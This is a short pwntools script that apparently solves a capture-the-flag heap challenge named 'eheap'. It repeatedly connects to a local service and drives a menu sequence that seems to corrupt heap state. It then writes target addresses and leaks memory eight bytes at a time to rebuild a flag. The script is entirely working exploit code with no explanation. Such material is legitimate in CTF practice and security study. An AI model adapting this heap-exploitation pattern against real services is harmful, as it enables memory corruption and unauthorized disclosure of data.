from pwn import *

context.terminal = ['terminator', '-e']
context.arch = 'amd64'
flag = b""
for i in range(0,10):
    p = remote("localhost", 1024)
    #p = process("./docker/eheap")
    #gdb.attach(p, '''
    #
    #b* 0x00000000004013af
    #c
    #''')
    print(p.recvuntil("4. write\n"))
    p.sendline("1")
    p.sendline("0")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("2")
    p.sendline("2")
    p.sendline("0")
    p.sendline("2")
    p.sendline("1")
    print("Leaking")
    p.sendline("4")
    p.sendline("1")
    p.sendline(p64(0x4040c0+(i*8)))
    p.sendline("1")
    p.sendline("0")
    p.sendline("1")
    p.sendline("1")
    p.sendline("3")
    p.sendline("1")
    p.recvuntil("result: ")
    flag += p.recvn(8)
print(flag)    
